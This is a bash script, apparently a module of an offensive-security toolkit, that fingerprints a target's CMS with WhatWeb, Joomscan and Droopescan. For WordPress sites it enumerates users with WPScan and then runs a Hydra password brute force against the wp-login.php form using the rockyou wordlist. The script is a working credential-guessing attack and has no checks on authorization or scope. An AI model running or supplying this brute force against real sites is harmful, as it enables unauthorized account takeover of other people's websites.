#!/bin/bash
# File: modules/cms_scan.sh
# Author: Neo-virex

# Colors
RED="\e[31m"
GREEN="\e[32m"
BLUE="\e[34m"
YELLOW="\e[33m"
RESET="\e[0m"

OUTDIR="/tmp/outputs"
mkdir -p "$OUTDIR"

echo -e "${BLUE}[*] Starting CMS Enumeration Module...${RESET}"
read -p "[?] Enter target IP or domain: " TARGET

CMS_DIR="$OUTDIR/cms_$TARGET"
mkdir -p "$CMS_DIR"

# Detect CMS using whatweb with detailed output
echo -e "${YELLOW}[+] Running WhatWeb for CMS detection...${RESET}"
whatweb -v "$TARGET" > "$CMS_DIR/whatweb_verbose.txt"

# WordPress specific scan with WPScan
if grep -qi "WordPress" "$CMS_DIR/whatweb_verbose.txt"; then
    echo -e "${YELLOW}[+] WordPress detected! Running WPScan enumeration...${RESET}"
    wpscan --url "$TARGET" --enumerate u,p,t,ap,at --output "$CMS_DIR/wpscan_enum.txt"

    # Extract usernames from WPScan results
    USERNAMES=($(grep "User ID" "$CMS_DIR/wpscan_enum.txt" | awk -F: '{print $2}' | tr -d ' '))
    if [ ${#USERNAMES[@]} -gt 0 ]; then
        echo -e "${GREEN}[✓] Usernames found:${RESET}"
        for i in "${!USERNAMES[@]}"; do
            echo "$((i+1))) ${USERNAMES[i]}"
        done

        read -p "[?] Do you want to brute force passwords for any username? (y/n): " BF_CHOICE
        if [[ "$BF_CHOICE" =~ ^[Yy]$ ]]; then
            read -p "[?] Select username number to brute force: " USER_NUM
            SELECTED_USER=${USERNAMES[$((USER_NUM-1))]}
            
            read -p "[?] Use default wordlist (/usr/share/wordlists/rockyou.txt)? (y/n): " WORDLIST_CHOICE
            if [[ "$WORDLIST_CHOICE" =~ ^[Yy]$ ]]; then
                WORDLIST="/usr/share/wordlists/rockyou.txt"
            else
                read -p "[?] Enter path to custom wordlist: " WORDLIST
            fi

            echo -e "${YELLOW}[+] Starting Hydra brute force on user $SELECTED_USER...${RESET}"
            hydra -l "$SELECTED_USER" -P "$WORDLIST" "$TARGET" http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect" -t 4 -o "$CMS_DIR/hydra_$SELECTED_USER.txt"
            echo -e "${GREEN}[✓] Hydra results saved in $CMS_DIR/hydra_$SELECTED_USER.txt${RESET}"
        fi
    else
        echo -e "${RED}[-] No usernames found for brute forcing.${RESET}"
    fi
else
    echo -e "${RED}[-] WordPress not detected or no CMS detected by WhatWeb.${RESET}"
fi

# Joomla scan
if grep -qi "Joomla" "$CMS_DIR/whatweb_verbose.txt"; then
    echo -e "${YELLOW}[+] Joomla detected! Running Joomscan...${RESET}"
    joomscan -u "$TARGET" -o "$CMS_DIR/joomscan.txt"
fi

# Drupal scan
if grep -qi "Drupal" "$CMS_DIR/whatweb_verbose.txt"; then
    echo -e "${YELLOW}[+] Drupal detected! Running Droopescan...${RESET}"
    droopescan scan drupal -u "$TARGET" > "$CMS_DIR/droopescan.txt"
fi

echo -e "${GREEN}[✓] CMS Enumeration Completed. Results saved in $CMS_DIR${RESET}"
